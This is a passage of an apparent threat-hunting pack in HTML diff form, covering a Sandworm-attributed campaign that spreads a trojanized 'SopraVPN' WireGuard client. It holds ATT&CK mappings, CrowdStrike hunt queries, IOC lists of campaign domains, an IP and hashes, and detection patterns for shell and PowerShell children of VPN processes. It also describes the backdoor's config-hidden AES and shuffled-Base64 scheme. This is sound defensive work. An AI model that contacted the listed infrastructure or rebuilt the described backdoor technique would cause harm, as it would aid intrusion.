+<div class="section" id="s6">
+  <div class="section-hdr"><span class="snum">06</span><h2>ATT&amp;CK Mapping</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Tactic</th><th>Technique</th><th>Name</th><th>Observed behavior</th></tr>
+      <tr><td>Reconnaissance</td><td>T1593.001</td><td>Search Open Websites/Domains: Social Media</td><td>Attacker reviews victim résumés on job-search platforms before making contact</td></tr>
+      <tr><td>Resource Development</td><td>T1585.001</td><td>Establish Accounts: Social Media Accounts</td><td>Fake recruiter personas and Telegram handle posing as ATLAS Business Group / Sopra Steria HR</td></tr>
+      <tr><td>Resource Development</td><td>T1583.001</td><td>Acquire Infrastructure: Domains</td><td><code>soprasteria-bg[.]com</code>, <code>soprasteriabg[.]com</code>, <code>atlasgroup-ua[.]com</code>, <code>douncloud[.]site</code> registered for the campaign</td></tr>
+      <tr><td>Resource Development</td><td>T1608.001</td><td>Stage Capabilities: Upload Malware</td><td>Trojanized SopraVPN installers staged on SourceForge</td></tr>
+      <tr><td>Resource Development</td><td>T1587.001</td><td>Develop Capabilities: Malware</td><td>Custom-compiled WireGuard fork with a SymmetricKey/AES-256-GCM backdoor</td></tr>
+      <tr><td>Initial Access</td><td>T1566.003</td><td>Phishing: Spearphishing via Service</td><td>Contact via job-platform chat and Telegram rather than direct email</td></tr>
+      <tr><td>Initial Access</td><td>T1204.002</td><td>User Execution: Malicious File</td><td>Victim manually downloads and runs SopraVPN.exe / sopravpn_v*.exe</td></tr>
+      <tr><td>Execution</td><td>T1059.001</td><td>Command and Scripting Interpreter: PowerShell</td><td>Windows payload decrypted and run via <code>runScriptCommand</code></td></tr>
+      <tr><td>Execution</td><td>T1059.004</td><td>Command and Scripting Interpreter: Unix Shell</td><td>Linux payload invoked through the same mechanism, using cURL</td></tr>
+      <tr><td>Persistence</td><td>T1053.005</td><td>Scheduled Task/Job: Scheduled Task</td><td>Windows PowerShell command registers a scheduled task for 2nd-stage retrieval</td></tr>
+      <tr><td>Defense Evasion</td><td>T1027</td><td>Obfuscated Files or Information</td><td>AES-256-GCM payload hidden inside VPN config values (<code>SymmetricKey</code>), not the binary</td></tr>
+      <tr><td>Defense Evasion</td><td>T1140</td><td>Deobfuscate/Decode Files or Information</td><td>Custom Fisher-Yates-shuffled Base64 alphabet, seeded from CRC32(SymmetricKey), decodes PrivateKey/PublicKey before use</td></tr>
+      <tr><td>Defense Evasion</td><td>T1036.005</td><td>Masquerading: Match Legitimate Name or Location</td><td>SopraVPN branding mimics Sopra Steria; binary built from genuine WireGuard source and behaves like a real VPN client</td></tr>
+      <tr><td>Command and Control</td><td>T1572</td><td>Protocol Tunneling</td><td>Linux 2nd-stage executable retrieved via cURL, routed through the established WireGuard tunnel to attacker-internal infrastructure</td></tr>
+      <tr><td>Command and Control</td><td>T1071.001</td><td>Application Layer Protocol: Web Protocols</td><td><code>douncloud[.]site</code> check-in over HTTPS with a UUID/MachineGUID beacon value</td></tr>
+      <tr><td>Command and Control</td><td>T1105</td><td>Ingress Tool Transfer</td><td>Scheduled task (Windows) / cURL (Linux) retrieve the second-stage payload</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- 7 -->
+<div class="section" id="s7">
+  <div class="section-hdr"><span class="snum">07</span><h2>Native Audit-Log Hunts</h2></div>
+  <div class="section-body">
+    <h3>Email gateway</h3>
+    <p>Search inbound mail for <code>.conf</code> attachments whose content contains the string <code>SymmetricKey</code> (not a legitimate WireGuard option), and for links to <code>soprasteria-bg.com</code>, <code>soprasteriabg.com</code> or <code>atlasgroup-ua.com</code>.</p>
+    <h3>DNS resolver / firewall logs</h3>
+    <p>Alert on any resolution of <code>soprasteria-bg.com</code>, <code>soprasteriabg.com</code>, <code>atlasgroup-ua.com</code>, <code>douncloud.site</code>; feed all four to an RPZ/sinkhole (Playbook 1, §13).</p>
+    <h3>Windows Event Log / Sysmon</h3>
+    <p>Security 4698 (scheduled task created) correlated with a parent process named <code>sopravpn*.exe</code>/<code>SopraVPN.exe</code> in the prior five minutes; Sysmon Event ID 1 with <code>ParentImage</code> matching a SopraVPN/WireGuard-family binary and <code>Image=powershell.exe</code>.</p>
+    <h3>Linux auditd</h3>
+    <p><code>execve</code> records for <code>/usr/bin/curl</code> (or execution of <code>/usr/libexec/timesyncd-check</code> itself) with a parent process from a WireGuard-family binary (<code>wg-quick</code>, <code>wireguard</code>, <code>sopravpn</code>); <code>ausearch -f /usr/libexec/timesyncd-check</code> (Playbook 5, §13).</p>
+    <h3>Config-file content review</h3>
+    <p><code>grep -RIl "SymmetricKey"</code> against any <code>.conf</code>/<code>.ini</code> file imported for VPN use across managed endpoints. This string does not exist in stock WireGuard and is a hard indicator on its own, independent of any hash or filename.</p>
+    <h3>Proxy / secure web gateway logs</h3>
+    <p>Downloads from <code>sourceforge.net/projects/soprabulgariavpn</code>, <code>/sopravpn</code>, or <code>/soprasteriavpn</code>.</p>
+    <h3>Security-awareness reporting channel (non-technical)</h3>
+    <p>Review any employee reports of a "recruiter" contact referencing ATLAS Business Group or Sopra Steria Bulgaria that asked for a VPN client install as part of a "technical assessment" — this is the highest-value early-warning signal and predates any endpoint telemetry.</p>
+  </div>
+</div>
+
+<!-- 8 -->
+<div class="section" id="s8">
+  <div class="section-hdr"><span class="snum">08</span><h2>CrowdStrike LogScale CQL Hunt Queries</h2></div>
+  <div class="section-body">
+    <div class="cloud-sel">
+      <label for="cloud-region">Falcon cloud (drives "Open in Falcon"):</label>
+      <select id="cloud-region">
+        <option value="https://falcon.crowdstrike.com">US-1</option>
+        <option value="https://falcon.us-2.crowdstrike.com">US-2</option>
+        <option value="https://falcon.eu-1.crowdstrike.com">EU-1</option>
+        <option value="https://falcon.laggar.gcw.crowdstrike.com">US-GOV-1</option>
+        <option value="https://falcon.us-gov-2.crowdstrike.mil">US-GOV-2</option>
+      </select>
+      <span class="cloud-hint">Pick your tenant's cloud first &mdash; every "Open in Falcon" button below uses this selection.</span>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q1 · SopraVPN trojanized client — execution (hash + filename)</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql1',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql1')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> execution of the SopraVPN binary by exact filename pattern or by one of the three published SHA256 hashes. <strong>FP:</strong> none expected — the only source of noise would be a legitimate internal tool coincidentally named "SopraVPN."</p>
+<pre class="cql" id="cql1"><span class="cm">// HUNT: SopraVPN Trojanized WireGuard Client — Execution</span>
+<span class="cm">// MITRE: T1204.002, T1036.005</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: ProcessRollup2 (Windows + Linux)</span>
+<span class="cm">// FALSE POSITIVES: none expected from filename/hash match alone</span>
+<span class="cm">// LOOKBACK: 90d</span>
+#event_simpleName=/ProcessRollup2|SyntheticProcessRollup2/
+| (FileName=/^(SopraVPN(\.exe)?|sopravpn_v[0-9]+(__[0-9]+_)?(\.exe)?)$/i or SHA256HashData=/^(4646ea832a61c9f7bdb11fee64ad82ae6d9856d2f3a4b36a8a4a571145be1260|aeb702f65445d12605a84be6fa31545c71be0bf619b1cbedbee5800a43fc6793|6a60152f7c83d3416925316b75eb7720953cdd69aae9f0e088c789c25f51437f)$/i)
+| table([@timestamp, ComputerName, UserName, FileName, ImageFileName, SHA256HashData, CommandLine, ParentBaseFileName], limit=max)
+| sort(@timestamp, order=desc)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q2 · WireGuard/SopraVPN parent spawning PowerShell or shell (backdoor trigger)</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-med">FP MED</span><span class="badge b-med">COST MED</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql2',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql2')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> the config-triggered backdoor firing — a WireGuard/SopraVPN-family parent process spawning an interpreter or shell child at tunnel-up. <strong>FP:</strong> legitimate WireGuard <code>PostUp</code>/<code>PostDown</code> hooks on Linux routinely spawn <code>ip</code>/<code>iptables</code> as children of <code>wg-quick</code> — this is expected and must be excluded; a PowerShell child on Windows is not stock WireGuard behavior and is high-fidelity on its own.</p>
+<pre class="cql" id="cql2"><span class="cm">// HUNT: WireGuard/SopraVPN Parent Spawning PowerShell or Shell (Config-Triggered Backdoor Execution)</span>
+<span class="cm">// MITRE: T1059.001, T1059.004, T1027, T1140</span>
+<span class="cm">// CONF: high  FP: medium  COST: medium | REQUIRES: ProcessRollup2 (parent/child correlation)</span>
+<span class="cm">// FALSE POSITIVES: legitimate wg-quick PostUp/PostDown hooks spawning ip/iptables/resolvconf on Linux</span>
+<span class="cm">// TUNING: exclude Linux children ip, iptables, ip6tables, resolvconf, nft spawned by wg-quick/wireguard (stock PostUp/PostDown behavior) — investigate every powershell.exe or curl child instead</span>
+<span class="cm">// LOOKBACK: 90d</span>
+#event_simpleName=/ProcessRollup2|SyntheticProcessRollup2/
+| ParentBaseFileName=/^(SopraVPN(\.exe)?|sopravpn_v[0-9]+(__[0-9]+_)?(\.exe)?|wireguard(\.exe)?|wg-quick)$/i
+| FileName=/^(powershell(\.exe)?|pwsh(\.exe)?|cmd(\.exe)?|curl(\.exe)?|bash|sh)$/i
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine], limit=200)
+| sort(@timestamp, order=desc)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q3 · Scheduled task creation following SopraVPN execution (Windows persistence)</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-med">FP MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql3',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql3')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> the Windows-side persistence step — a scheduled task registered shortly after (or by) a SopraVPN-family process. <strong>FP:</strong> <code>schtasks.exe /create</code> is also used by many legitimate installers and IT deployment tooling.</p>
+<pre class="cql" id="cql3"><span class="cm">// HUNT: Scheduled Task Creation Following SopraVPN Execution (Windows Persistence)</span>
+<span class="cm">// MITRE: T1053.005</span>
+<span class="cm">// CONF: high  FP: medium  COST: low | REQUIRES: ProcessRollup2 (schtasks.exe invocation)</span>
+<span class="cm">// FALSE POSITIVES: schtasks.exe is used by many legitimate installers and IT deployment tools</span>
+<span class="cm">// TUNING: correlate against a SopraVPN/sopravpn_v*/wireguard parent or a process launched from Downloads/Temp within the prior 10 minutes on the same host; exclude schtasks.exe invocations from known deployment tools (SCCM, Intune, PDQ, Ninite) by ParentBaseFileName</span>
+<span class="cm">// LOOKBACK: 90d</span>
+#event_simpleName=ProcessRollup2
+| FileName=/^schtasks(\.exe)?$/i
+| CommandLine=/\/create/i
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName, CommandLine], limit=200)
+| sort(@timestamp, order=desc)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q4 · Network/DNS activity to confirmed SopraVPN campaign infrastructure</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql4',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql4')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> DNS resolution or a direct connection to any of the four CERT-UA-published campaign domains, or to the rogue WireGuard endpoint IP. <strong>FP:</strong> none expected — these are campaign-registered domains and a rogue endpoint, not shared/CDN infrastructure.</p>
+<pre class="cql" id="cql4"><span class="cm">// HUNT: Network/DNS Activity to Confirmed SopraVPN Campaign Infrastructure</span>
+<span class="cm">// MITRE: T1071.001, T1583.001</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: DnsRequest, NetworkConnectIP4</span>
+<span class="cm">// FALSE POSITIVES: none expected — campaign-registered infrastructure, not shared/CDN</span>
+<span class="cm">// LOOKBACK: 90d</span>
+#event_simpleName=/DnsRequest|NetworkConnectIP4/
+| (DomainName=/^(www\.)?(soprasteria-bg|soprasteriabg|atlasgroup-ua)\.com$/i or DomainName=/^(www\.)?douncloud\.site$/i or RemoteAddressIP4="139.28.36.23")
+| table([@timestamp, ComputerName, UserName, ContextBaseFileName, DomainName, RemoteAddressIP4, RemotePort], limit=200)
+| sort(@timestamp, order=desc)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q5 · WireGuard tunnel established to rogue SopraVPN endpoint (UDP/51820)</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql5',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql5')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> a WireGuard handshake specifically to the rogue endpoint IP on its published port. <strong>FP:</strong> none on the specific IP; do not broaden to "any UDP/51820" without re-adding the IP filter, since legitimate corporate WireGuard endpoints also use that port.</p>
+<pre class="cql" id="cql5"><span class="cm">// HUNT: WireGuard Tunnel Established to Rogue SopraVPN Endpoint (UDP/51820)</span>
+<span class="cm">// MITRE: T1572, T1090</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: NetworkConnectIP4</span>
+<span class="cm">// FALSE POSITIVES: none on the specific IP; do not drop the RemoteAddressIP4 filter</span>
+<span class="cm">// LOOKBACK: 90d</span>
+#event_simpleName=NetworkConnectIP4
+| RemoteAddressIP4="139.28.36.23"
+| RemotePort=51820
+| table([@timestamp, ComputerName, UserName, ContextBaseFileName, RemoteAddressIP4, RemotePort, Protocol_decimal], limit=200)
+| sort(@timestamp, order=desc)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q6 · Linux second-stage retrieval via cURL — timesyncd-check masquerade</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-med">FP MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql6',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql6')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> the exact CERT-UA-published Linux drop path, plus general cURL activity for pivoting. <strong>FP:</strong> <code>curl</code> is a common admin utility; the exact path <code>/usr/libexec/timesyncd-check</code> is not a real systemd component and is high-fidelity on its own regardless of parent process.</p>
+<pre class="cql" id="cql6"><span class="cm">// HUNT: Linux Second-Stage Retrieval via cURL — timesyncd-check Masquerade</span>
+<span class="cm">// MITRE: T1105, T1036.005, T1059.004</span>
+<span class="cm">// CONF: high  FP: medium  COST: low | REQUIRES: ProcessRollup2 (Linux)</span>
+<span class="cm">// FALSE POSITIVES: curl is a common admin utility on its own; the exact path is the high-fidelity signal</span>
+<span class="cm">// TUNING: if broadening beyond the exact timesyncd-check path, require the parent process to be a WireGuard-family binary (wireguard, wg-quick, sopravpn, sopraconf) before treating a bare curl hit as actionable</span>
+<span class="cm">// LOOKBACK: 90d</span>
+#event_simpleName=ProcessRollup2
+| platform=Lin
+| (CommandLine=/timesyncd-check/i or FileName=/^curl$/i)
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine], limit=200)
+| sort(@timestamp, order=desc)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q7 · SourceForge download of SopraVPN-branded installer (trusted-platform abuse)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-high">FP HIGH</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql7',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql7')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> any connection to SourceForge, as a pivot lead only. <strong>FP:</strong> SourceForge is a widely-used legitimate software distribution platform; this query alone will catch large amounts of benign developer/IT traffic and must never be used standalone.</p>
+<pre class="cql" id="cql7"><span class="cm">// HUNT: SourceForge Download of SopraVPN-Branded Installer (Trusted-Platform Abuse)</span>
+<span class="cm">// MITRE: T1608.001, T1204.002</span>
+<span class="cm">// CONF: medium  FP: high  COST: low | REQUIRES: DnsRequest, NetworkConnectIP4</span>
+<span class="cm">// FALSE POSITIVES: SourceForge is widely-used legitimate software distribution; this query alone catches large amounts of benign developer/IT traffic</span>
+<span class="cm">// TUNING: never alert on this query alone; require a same-host, same-session correlation with Q1 (SopraVPN hash/filename match) or a file write of a *.exe named sopravpn*/soprabulgariavpn*/soprasteriavpn* within minutes of the SourceForge connection before treating as actionable</span>
+<span class="cm">// LOOKBACK: 90d</span>
+#event_simpleName=/DnsRequest|NetworkConnectIP4/
+| DomainName=/^(www\.)?sourceforge\.net$/i
+| table([@timestamp, ComputerName, UserName, ContextBaseFileName, DomainName, RemoteAddressIP4], limit=200)
+| sort(@timestamp, order=desc)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q8 · Periodic beaconing to SopraVPN C2 domain (douncloud[.]site)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-med">FP MED</span><span class="badge b-med">COST MED</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql8',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql8')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> a regular-interval query pattern to the C2 domain, per host/process, as a beaconing-cadence signal that survives infrastructure rotation better than a static match alone. <strong>FP:</strong> legitimate scheduled telemetry/update agents on the same host can produce a similar regular-interval pattern to an unrelated <code>.site</code> domain.</p>
+<pre class="cql" id="cql8"><span class="cm">// HUNT: Periodic Beaconing to SopraVPN C2 Domain (douncloud[.]site) or Look-Alike Infrastructure</span>
+<span class="cm">// MITRE: T1071.001, T1583.001</span>
+<span class="cm">// CONF: medium  FP: medium  COST: medium | REQUIRES: DnsRequest</span>
+<span class="cm">// FALSE POSITIVES: legitimate scheduled telemetry/monitoring agents can produce a similar regular-interval pattern</span>
+<span class="cm">// TUNING: raise the count threshold (default &gt;=5 in the lookback window) if the environment has other frequent internal callers to unrelated .site domains; exclude known monitoring/APM agents by ContextBaseFileName</span>
+<span class="cm">// LOOKBACK: 7d</span>
+#event_simpleName=DnsRequest
+| DomainName=/^(www\.)?douncloud\.site$/i
+| groupBy([aid, ComputerName, ContextBaseFileName], function=[count(as=QueryCount), min(@timestamp, as=FirstSeen), max(@timestamp, as=LastSeen)], limit=500)
+| QueryCount&gt;=5
+| table([ComputerName, ContextBaseFileName, QueryCount, FirstSeen, LastSeen], limit=200)
+| sort(QueryCount, order=desc)</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 9 -->
+<div class="section" id="s9">
+  <div class="section-hdr"><span class="snum">09</span><h2>CrowdStrike Custom IOA Recommendations</h2></div>
+  <div class="section-body">
+    <p>Three queries are near-zero-FP path/hash matches strong enough to promote directly; one more promotes with a correlation constraint. The rest stay investigate-only.</p>
+    <table>
+      <tr><th>IOA name</th><th>From</th><th>Pattern</th><th>Exclusions</th><th>Action</th></tr>
+      <tr><td>SopraVPN · Trojanized Client Execution</td><td>Q1</td><td>Process Creation — filename/hash match on the published SopraVPN artifacts</td><td>None known</td><td><strong>Prevent (Critical)</strong> — hash/filename match has no benign use case</td></tr>
+      <tr><td>SopraVPN · Rogue WireGuard Endpoint</td><td>Q5</td><td>Network Connection — UDP/51820 to <code>139.28.36.23</code></td><td>None known</td><td><strong>Prevent (Critical)</strong> at the network layer / Detect (Critical) at the endpoint</td></tr>
+      <tr><td>SopraVPN · Linux timesyncd-check Masquerade</td><td>Q6</td><td>Process/File — exact path <code>/usr/libexec/timesyncd-check</code></td><td>None known</td><td>Detect (Critical) — promote to Prevent after a short pilot</td></tr>
+      <tr><td>SopraVPN · Scheduled Task Following Execution</td><td>Q3</td><td>Process Creation — <code>schtasks.exe /create</code> correlated with a SopraVPN/WireGuard-family parent within 10 minutes</td><td>Known deployment tooling (SCCM, Intune, PDQ, Ninite) by ParentBaseFileName</td><td>Detect (High) — move to Prevent only after a clean two-week baseline</td></tr>
+    </table>
+    <h3>Investigate-only (do not promote yet)</h3>
+    <ul>
+      <li><strong>Q2</strong> — the parent-child PowerShell/shell fingerprint has a real benign population on the Linux <code>PostUp</code> side; baseline for 14 days and fold the exclusions into the rule before promotion.</li>
+      <li><strong>Q7</strong> — SourceForge is legitimate infrastructure; never promote to an IOA on its own. Keep as a pivot lead only, correlated against Q1.</li>
+      <li><strong>Q8</strong> — beaconing cadence needs an environment-specific threshold; baseline for 14 days before any alerting action.</li>
+      <li><strong>Q4</strong> — better served by Falcon IOC Management (§10) than by an IOA, since it is pure atomic domain/IP matching.</li>
+    </ul>
+    <h3>Deployment path</h3>
+    <ol>
+      <li>Endpoint security → Custom IOA rule groups → create a Windows/Linux rule group named <code>Sandworm-SopraVPN</code>.</li>
+      <li>Add each rule in <em>Monitor</em> action first; assign the group to a pilot prevention policy covering a small subset of workstations.</li>
+      <li>Review hits daily for 14 days, folding every benign hit into the rule's exclusion list.</li>
+      <li>Promote to Detect (Q3) and Prevent (Q1, Q5, Q6) estate-wide.</li>
+    </ol>
+  </div>
+</div>
+
+<!-- 10 -->
+<div class="section" id="s10">
+  <div class="section-hdr"><span class="snum">10</span><h2>Machine-Readable IOC Appendix</h2></div>
+  <div class="section-body">
+    <div class="ioc-grab-grid">
+
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Falcon IOC Management CSV</span><span class="igc">bulk import</span></div>
+        <button class="btn-copy" data-label="Copy CSV" onclick="copyBlock('grab-csv',this)" style="margin:0 0 6px;">Copy CSV</button>
+<pre class="code" id="grab-csv">type,value,action,severity,expiration,description,tags
+sha256,4646ea832a61c9f7bdb11fee64ad82ae6d9856d2f3a4b36a8a4a571145be1260,prevent,critical,2027-02-23,SopraVPN trojanized WireGuard installer (sopravpn_v7),campaign:Sandworm-SopraVPN
+sha256,aeb702f65445d12605a84be6fa31545c71be0bf619b1cbedbee5800a43fc6793,prevent,critical,2027-02-23,SopraVPN.exe trojanized WireGuard client (variant 1),campaign:Sandworm-SopraVPN
+sha256,6a60152f7c83d3416925316b75eb7720953cdd69aae9f0e088c789c25f51437f,prevent,critical,2027-02-23,SopraVPN.exe trojanized WireGuard client (variant 2),campaign:Sandworm-SopraVPN
+sha256,480ab92995295378c9b30b8b6fb61516313ed7482eb893967841b05e233fe341,detect,high,2026-11-23,malicious Windows WireGuard config with SymmetricKey backdoor,campaign:Sandworm-SopraVPN
+sha256,22a21958a2c4752214192175793c13acae2f6d766007d55d2140f1570ae1df67,detect,high,2026-11-23,malicious Linux WireGuard config with SymmetricKey backdoor,campaign:Sandworm-SopraVPN
+domain,soprasteria-bg.com,detect,high,2027-02-23,spoofed Sopra Steria Bulgaria lure site,campaign:Sandworm-SopraVPN
+domain,soprasteriabg.com,detect,high,2027-02-23,related spoof domain,campaign:Sandworm-SopraVPN
+domain,atlasgroup-ua.com,detect,high,2027-02-23,fake ATLAS Business Group recruiter site,campaign:Sandworm-SopraVPN
+domain,douncloud.site,detect,critical,2027-02-23,SopraVPN C2 check-in domain,campaign:Sandworm-SopraVPN
+ipv4,139.28.36.23,detect,critical,2027-02-23,rogue WireGuard endpoint udp/51820,campaign:Sandworm-SopraVPN
+# md5 companions (Falcon IOC Management accepts md5 as its own type row if preferred over sha256):
+md5,bf6670760305228fd83a5e1467a99d91,detect,high,2026-11-23,sopravpn_v7__1_.exe (MD5),campaign:Sandworm-SopraVPN
+md5,be11cc798c239b9d4eaa76ab03d07168,detect,high,2026-11-23,SopraVPN.exe variant 1 (MD5),campaign:Sandworm-SopraVPN
+md5,676f44c7fa03693247d0dd5c3a0e13f7,detect,high,2026-11-23,SopraVPN.exe variant 2 (MD5),campaign:Sandworm-SopraVPN</pre>
+      </div>
+
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Behavioral Signatures</span><span class="igc">survives rotation</span></div>
+        <button class="btn-copy" data-label="Copy signals" onclick="copyBlock('grab-behav',this)" style="margin:0 0 6px;">Copy signals</button>
+<pre class="code" id="grab-behav">BEHAVIORAL SIGNALS - Sandworm SopraVPN campaign (no atomic indicator required)
+
+B1  Config key "SymmetricKey" present in any WireGuard .conf file. Stock
+    WireGuard has no such option — this string alone is a hard indicator.
+B2  AES-256-GCM key = 32-byte decode of the same config's own "PrivateKey"
+    value (self-referential key derivation — not how a real corporate VPN
+    key is ever provisioned).
+B3  Custom Base64 alphabet: Fisher-Yates shuffle seeded by CRC32("SymmetricKey"
+    value) applied to PrivateKey/PublicKey encoding.
+B4  Parent: SopraVPN.exe | sopravpn_v*.exe | wireguard.exe | wg-quick  ->
+    Child: powershell.exe (Windows) or curl/sh/bash (Linux) shortly after
+    tunnel-up. Stock WireGuard PostUp only spawns ip/iptables/resolvconf.
+B5  Host artifact (Linux): /usr/libexec/timesyncd-check — not a genuine
+    systemd-timesyncd component.
+B6  Host artifact (Windows): scheduled task under
+    \Microsoft\Windows\ApplicationData\Microsoft created within minutes of
+    a SopraVPN-family process running.
+B7  Outbound HTTPS to a .site domain carrying a query/path value shaped like
+    %UUID%---%MACHINEGUID% (douncloud[.]site check-in pattern).</pre>
+      </div>
+
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Named Malware &amp; Tooling</span><span class="igc">reference</span></div>
+        <button class="btn-copy" data-label="Copy names" onclick="copyBlock('grab-names',this)" style="margin:0 0 6px;">Copy names</button>
+<pre class="code" id="grab-names">SANDWORM SOPRAVPN CAMPAIGN — reference (CERT-UA article 6318863)
+
+Malware / tooling:  SopraVPN (trojanized WireGuard client)
+                     sopraconf.conf / sopraconfLinux.conf (malicious VPN configs)
+Threat actor:        Sandworm | APT44 | Seashell Blizzard | UAC-0002 | UAC-0145 (sub-cluster)
+Impersonated brand:  Sopra Steria (Bulgaria office) — soprasteria-bg[.]com is NOT
+                     affiliated with the real company
+Fake recruiter:      "ATLAS Business Group" — atlasgroup-ua[.]com
+Platform abused:     SourceForge (sourceforge.net/projects/soprabulgariavpn,
+                     /sopravpn, /soprasteriavpn)
+Telegram handle:     @Sales_ManagerABG (style/format observed by CERT-UA)
+
+RELATED UAC-0145 TRACK (different vector — do not conflate)
+UAC0145-ClickFix-Hunt  ClickFix CAPTCHA lures, a distinct typosquat C2 domain,
+                       GHETTOVIBE/FLUIDLEECH/FREAKYPOLL/SMARTAXE/COWARDDUCK —
+                       a separate, previously-published HuntPack (see that
+                       pack's own IOC set; not repeated here)</pre>
+      </div>
+
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Managed-Device &amp; Config Audit</span><span class="igc">checklist</span></div>
+        <button class="btn-copy" data-label="Copy checklist" onclick="copyBlock('grab-audit',this)" style="margin:0 0 6px;">Copy checklist</button>
+<pre class="code" id="grab-audit">AUDIT CHECKLIST - run per host / per fleet, compare against intended baseline
+
+# 1. Managed-device / EDR coverage audit (CERT-UA's core recommendation)
+#    List all devices with corporate VPN/resource access NOT enrolled in EDR —
+#    this campaign's entire payload depends on an unmanaged endpoint.
+
+# 2. Confirm conditional access / NAC blocks unmanaged devices from corporate
+#    resources, including BYOD used for "hiring assessments" (see Playbook 4).
+
+# 3. Endpoint config sweep — any hit below is a hard indicator:
+grep -RIl "SymmetricKey" / --include=*.conf 2>/dev/null
+
+# 4. Inventory installed VPN clients; flag any binary named SopraVPN* or
+#    sopravpn_v*.exe / sopraconf*.conf not sourced from the official
+#    WireGuard installer.
+
+# 5. Confirm security-awareness training / hiring-process policy explicitly
+#    warns IT staff never to install software provided by a prospective
+#    employer before an offer is signed.</pre>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- 11 -->
+<div class="section" id="s11">
+  <div class="section-hdr"><span class="snum">11</span><h2>Detection Validation Gates</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Gate</th><th>Test</th><th>Pass criterion</th></tr>
+      <tr><td>G1 · Telemetry ready</td><td>Confirm <code>ProcessRollup2</code>, <code>DnsRequest</code>, <code>NetworkConnectIP4</code> are all present for a representative Windows host <em>and</em> a representative Linux host over the last 24h</td><td>All three event types return rows on both platforms. Linux sensor density on sysadmin jump boxes is historically lower — verify explicitly, don't assume parity with the Windows fleet.</td></tr>
+      <tr><td>G2 · Benign baseline</td><td>Run Q2, Q3, Q7, Q8 across 14 days with no exclusions</td><td>Each query's benign population is enumerated and written into its TUNING line before promotion</td></tr>
